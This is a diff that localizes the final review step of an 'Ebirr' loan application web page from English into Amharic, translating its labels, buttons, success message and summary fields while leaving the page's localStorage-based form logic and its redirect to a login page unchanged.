@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="am">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ebirr - Loan Application</title>
+    <title>ኢብር - የብድር ማመልከቻ</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
         * {
@@ -307,36 +307,36 @@
 <body>
     <header>
         <button class="back-btn" onclick="history.back()">←</button>
-        <div class="logo"><span class="logo-eco">Ebirr</span><span class="logo-cash">Loan</span></div>
+        <div class="logo"><span class="logo-eco">ኢብር</span><span class="logo-cash">ብድር</span></div>
         <div></div>
     </header>
 
     <main class="card">
         <div class="top">
-            <h1 class="form-title">Final Review</h1>
+            <h1 class="form-title">የመጨረሻ ግምገማ</h1>
             <div class="progress-bar">
                 <div class="progress-fill"></div>
             </div>
-            <div class="step-text">Step 3 of 3</div>
-            <label class="form-label">Employment Status</label>
+            <div class="step-text">ደረጃ 3 ከ 3</div>
+            <label class="form-label">የስራ ሁኔታ</label>
             <select class="form-select" id="employmentStatus">
-                <option>Employed</option>
-                <option>Self-Employed</option>
-                <option>Unemployed</option>
-                <option>Student</option>
+                <option>ተቀጣሪ</option>
+                <option>የራስ ቅጥር</option>
+                <option>ስራ አጥ</option>
+                <option>ተማሪ</option>
             </select>
-            <label class="form-label">Annual Income (ETB)</label>
+            <label class="form-label">ዓመታዊ ገቢ (ብር)</label>
             <input type="number" class="form-input" id="annualIncome" placeholder="50000">
             <div class="summary-box" id="summaryBox">
                 <!-- Filled dynamically by JavaScript -->
             </div>
         </div>
         <div class="btn-group">
-            <button class="prev-btn" onclick="history.back()">PREVIOUS</button>
-            <button class="submit-btn" id="submitBtn">SUBMIT APPLICATION</button>
+            <button class="prev-btn" onclick="history.back()">ወደ ኋላ</button>
+            <button class="submit-btn" id="submitBtn">ማመልከቻ አስገባ</button>
         </div>
     </main>
-    <footer>© 2025 Ebirr</footer>
+    <footer>© 2025 ኢብር</footer>
     <!-- Spinner Overlay (Transparent Bluish) -->
     <div id="spinnerOverlay">
         <div class="spinner"></div>
@@ -345,27 +345,27 @@
     <div id="successOverlay">
         <div class="success-card">
             <div class="check-icon">✓</div>
-            <div class="success-title">Loan Application Submitted</div>
+            <div class="success-title">የብድር ማመልከቻ ተልኳል</div>
             <div class="success-msg">
-                Your loan application has been submitted. Please wait for approval.<br><br> You will receive a confirmation message. For now, proceed to Ebirr.
+                የብድር ማመልከቻዎ ተልኳል። እባክዎ ማረጋገጫን ይጠብቁ።<br><br>የማረጋገጫ መልእክት ይደርስዎታል። ለአሁን ወደ ኢብር ይቀጥሉ።
             </div>
             <div class="redirect-bar">
                 <div class="loader"></div>
-                Redirecting to Ebirr login in <span id="countdown">3</span>...
+                ወደ ኢብር ገቢ በመቀየር ላይ በ<span id="countdown">3</span>...
             </div>
-            <button class="go-login-btn" onclick="window.location.href='login.html'">Go to Login Now</button>
+            <button class="go-login-btn" onclick="window.location.href='login.html'">ወደ መግቢያ ይሂዱ</button>
         </div>
     </div>
     <script>
         const summaryBox = document.getElementById('summaryBox');
         summaryBox.innerHTML = `
-            <div class="summary-row"><span>Loan Type:</span><span class="summary-value">${localStorage.getItem('loanType') || 'Personal Loan'}</span></div>
-            <div class="summary-row"><span>Amount:</span><span class="summary-value">ETB${parseFloat(localStorage.getItem('loanAmount') || 5000).toLocaleString()}</span></div>
-            <div class="summary-row"><span>Term:</span><span class="summary-value">${localStorage.getItem('loanTerm') || '12'} Months</span></div>
-            <div class="summary-row"><span>Purpose:</span><span class="summary-value">${localStorage.getItem('loanPurpose') || 'Not specified'}</span></div>
-            <div class="summary-row"><span>Name:</span><span class="summary-value">${localStorage.getItem('firstName') || ''} ${localStorage.getItem('lastName') || ''}</span></div>
-            <div class="summary-row"><span>Email:</span><span class="summary-value">${localStorage.getItem('email') || 'N/A'}</span></div>
-            <div class="summary-row"><span>Phone:</span><span class="summary-value">+251 ${localStorage.getItem('phone') || 'N/A'}</span></div>
+            <div class="summary-row"><span>የብድር አይነት፦</span><span class="summary-value">${localStorage.getItem('loanType') || 'የግል ብድር'}</span></div>
+            <div class="summary-row"><span>መጠን፦</span><span class="summary-value">ብር${parseFloat(localStorage.getItem('loanAmount') || 5000).toLocaleString()}</span></div>
+            <div class="summary-row"><span>ጊዜ፦</span><span class="summary-value">${localStorage.getItem('loanTerm') || '12'} ወራት</span></div>
+            <div class="summary-row"><span>አላማ፦</span><span class="summary-value">${localStorage.getItem('loanPurpose') || 'አልተገለጸም'}</span></div>
+            <div class="summary-row"><span>ስም፦</span><span class="summary-value">${localStorage.getItem('firstName') || ''} ${localStorage.getItem('lastName') || ''}</span></div>
+            <div class="summary-row"><span>ኢሜይል፦</span><span class="summary-value">${localStorage.getItem('email') || 'የለም'}</span></div>
+            <div class="summary-row"><span>ስልክ፦</span><span class="summary-value">+251 ${localStorage.getItem('phone') || 'የለም'}</span></div>
         `;
         if (localStorage.getItem('employmentStatus')) {
             document.getElementById('employmentStatus').value = localStorage.getItem('employmentStatus');
@@ -376,7 +376,7 @@
         document.getElementById('submitBtn').addEventListener('click', function() {
             const income = document.getElementById('annualIncome').value.trim();
             if (!income || income < 1000) {
-                alert('Please enter a valid annual income (minimum $1,000).');
+                alert('እባክዎ ትክክለኛ ዓመታዊ ገቢ ያስገቡ (ቢያንስ ብር 1,000)።');
                 return;
             }
             localStorage.setItem('employmentStatus', document.getElementById('employmentStatus').value);
